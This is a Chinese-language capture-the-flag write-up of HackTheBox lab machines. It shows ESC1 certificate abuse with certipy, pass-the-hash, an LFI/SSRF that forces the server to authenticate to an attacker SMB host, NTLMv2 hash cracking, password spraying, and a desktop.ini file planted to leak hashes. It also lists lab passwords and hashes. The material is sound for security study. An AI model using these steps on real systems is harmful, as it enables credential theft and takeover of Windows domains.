True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : 16777216</span><br><span class="line">                                          65536</span><br><span class="line">                                          ExportableKey</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Encrypting File System</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 10 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Domain Users</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>
<p>模板名为<code>UserAuthentication</code>, CA为<code>sequel-DC-CA</code></p>
<p>错误配置证书模板的配置条件为以下三点，分别对应任意证书申请对象，证书可用于AD，证书申请者为经验证的域用户</p>
<ul>
<li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</li>
<li>PkiExtendedKeyUsage: Client Authentication</li>
<li>Enrollment Rights: Authenticated Users</li>
</ul>
<p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure>
<p>证书名如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator.pfx</span><br></pre></td></tr></table></figure>
<p>同步时间</p>
<p>使用证书通过Kerberos生成TGT并还原为NT Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.11.202 &amp;&amp; certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
<p>得到Hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure>
<p>Hash传递登入winrm</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure>
<p>查看root.txt</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a54e5111794f55e2445b72fdcc3291d6</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>openvpn与Kerberos的竞争</p>
</blockquote>
<p>靶机的CST比现实的快了8个小时，所以自然就有了以下错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br></pre></td></tr></table></figure>
<p>原以为一条命令就能解决的事情</p>
<p><code>ntpdate -u 10.10.11.202</code></p>
<p>毕竟之前（一年半以前）也碰到过类似的情况</p>
<p>然而命令并没有生效</p>
<p>确切来讲是生效几秒后就会自动调回去</p>
<p>结合另外一个正在运行openvpn的窗口总是在我运行时间同步命令的时候重连vpn</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[htb] Inactivity timeout (--ping-restart), restarting</span><br></pre></td></tr></table></figure>
<p>所以这就是问题所在，大概是opevpn也要做时间同步</p>
<p>但是所幸openvpn的时间同步有一段间隔时间</p>
<p>多试几次卡在间隔时间跑完命令就行</p>
<p>估计是openvpn的更新加了这个功能，下次遇到再看看怎么调参数忽略openvpn的时间同步吧</p>
<hr />
<p>Nice one.</p>
<h1 id="hackthebox_flight"><a class="markdownIt-Anchor" href="#hackthebox_flight"></a> HackTheBox_Flight</h1>
<h2 id="信息收集-8"><a class="markdownIt-Anchor" href="#信息收集-8"></a> 信息收集</h2>
<h3 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.187</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.187</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">80&#x2F;tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1)</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-09 17:59:10Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;9%Time&#x3D;6409BDB7%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: G0; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-5"><a class="markdownIt-Anchor" href="#路径枚举-5"></a> 路径枚举</h3>
<p>未枚举出路径</p>
<h3 id="vhost-2"><a class="markdownIt-Anchor" href="#vhost-2"></a> VHOST</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.187/ | grep htb</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lf&quot;</span>&gt;</span>Copyright 2022 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>flight.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> - All Rights Reserved<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到域名<code>flight.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tflight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>枚举VHOST</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://flight.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.flight.htb&quot;</span> --hl 154</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000624:   200        90 L     412 W      3996 Ch     &quot;school&quot;</span><br></pre></td></tr></table></figure>
<p>得到域名<code>school.flight.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tschool.flight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2>
<p>LFI?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=index.php</span><br></pre></td></tr></table></figure>
<p>HTML源码中得到index.php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(strtolower(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])),<span class="string">&#x27;filter&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;\\&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;htaccess&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;.shtml&#x27;</span>)!==<span class="literal">false</span>)</span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Suspicious Activity Blocked!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Incident will be reported&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]);	</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;C:\\xampp\\htdocs\\school.flight.htb\\home.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SSRF发起SMB请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=//10.10.16.12/BFL</span><br></pre></td></tr></table></figure>
<p>得到NTLMv2如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_apache::flight:d5bf8d2c6c495f7b:056EEC55DECB7A98AE95A4035C337D4A:010100000000000080156333C353D90175771A5F2C2A58F90000000002000800560050004D00430001001E00570049004E002D003300590036004E00470042005800320052005200370004003400570049004E002D003300590036004E0047004200580032005200520037002E00560050004D0043002E004C004F00430041004C0003001400560050004D0043002E004C004F00430041004C0005001400560050004D0043002E004C004F00430041004C000700080080156333C353D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure>
<p>hashcat爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到密码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S@Ss!K@*t13</span><br></pre></td></tr></table></figure>
<p>枚举SMB用户名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --users</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 2 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 1 desc: N</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 1 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B</span><br></pre></td></tr></table></figure>
<p>用户名列表如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat users</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O.Possum</span><br><span class="line">svc_apache</span><br><span class="line">V.Stevens</span><br><span class="line">D.Truff</span><br><span class="line">I.Francis</span><br><span class="line">W.Walker</span><br><span class="line">C.Bum</span><br><span class="line">M.Gold</span><br><span class="line">L.Kein</span><br><span class="line">G.Lors</span><br><span class="line">R.Cold</span><br><span class="line">S.Moon</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
<p>测试同密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u ./users -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --continue-on-success</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\S.Moon:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
<p>密码命中用户<code>S.Moon</code></p>
<p>查看SMB路径权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u S.Moon -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445	Name: 10.10.11.187</span><br><span class="line">    Disk                                                Permissions		Comment</span><br><span class="line">	----                                                -----------		-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS		Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS		Default share</span><br><span class="line">	IPC$                                              	READ ONLY		Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY		Logon server share </span><br><span class="line">	Shared                                            	READ, WRITE</span><br><span class="line">	SYSVOL                                            	READ ONLY		Logon server share </span><br><span class="line">	Users                                             	READ ONLY</span><br><span class="line">	Web                                               	READ ONLY</span><br></pre></td></tr></table></figure>
<p>错误方法</p>
<p><s>嗨呀，smb分享路径写权限一眼psexec GetShell</s></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py flight.htb/S.Moon:<span class="string">&#x27;S@Ss!K@*t13&#x27;</span>@10.10.11.187</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting shares on 10.10.11.187.....</span><br><span class="line">[-] share &#39;ADMIN$&#39; is not writable.</span><br><span class="line">[-] share &#39;C$&#39; is not writable.</span><br><span class="line">[-] share &#39;NETLOGON&#39; is not writable.</span><br><span class="line">[*] Found writable share Shared</span><br><span class="line">[*] Uploading file gpbkeZsf.exe</span><br><span class="line">[-] Error uploading file gpbkeZsf.exe, aborting.....</span><br><span class="line">[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br></pre></td></tr></table></figure>
<p><s>What the hell?</s></p>
<p>正确方法</p>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure>
<p>利用写权限上传desktop.ini用于触发SMB请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat desktop.ini</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure>
<p>上传desktop.ini</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.187/shared -U S.Moon --password=<span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br><span class="line">put desktop.ini</span><br></pre></td></tr></table></figure>
<p>得到NTLMv2如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.bum::flight.htb:e432c50eb3a75399:595CE71063742D2A3FCC6348F3B5782E:010100000000000000909C42D053D90114DEF6163CCF2D770000000002000800510051004E00460001001E00570049004E002D003800430051004900460035005800510038004C004B0004003400570049004E002D003800430051004900460035005800510038004C004B002E00510051004E0046002E004C004F00430041004C0003001400510051004E0046002E004C004F00430041004C0005001400510051004E0046002E004C004F00430041004C000700080000909C42D053D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure>
<p>hashcat爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到明文如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tikkycoll_431012284</span><br></pre></td></tr></table></figure>
<p>查看SMB路径权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u c.bum -p Tikkycoll_431012284</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445	Name: 10.10.11.187</span><br><span class="line">    Disk                                                Permissions		Comment</span><br><span class="line">	----                                                -----------		-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS		Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS		Default share</span><br><span class="line">	IPC$                                              	READ ONLY		Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY		Logon server share </span><br><span class="line">	Shared                                            	READ, WRITE	</span><br><span class="line">	SYSVOL                                            	READ ONLY		Logon server share </span><br><span class="line">	Users                                             	READ ONLY	</span><br><span class="line">	Web                                               	READ, WRITE</span><br></pre></td></tr></table></figure>
<p><s>嗨呀，psexec</s></p>
<p>与之前一样的原因，写入Shared无法反弹Shell<br />
本来想试着写入Web的，结果psexec是按顺序尝试写入分享路径，在分享路径Shared尝试失败后就推出了<br />
整了半天不知道怎么指定分享路径Web，只能写Webshell了</p>
<p>Weevely的create_function()不被php8所支持导致Webshell不可用<br />
apt-get升级跟github下载项目都不行<br />
大概看了一眼issue<br />
作者说create_function是在内存中运行的，其他的函数都没有这个效果<br />
然后好像就摆烂了？<br />
没办法，上蚁剑吧</p>
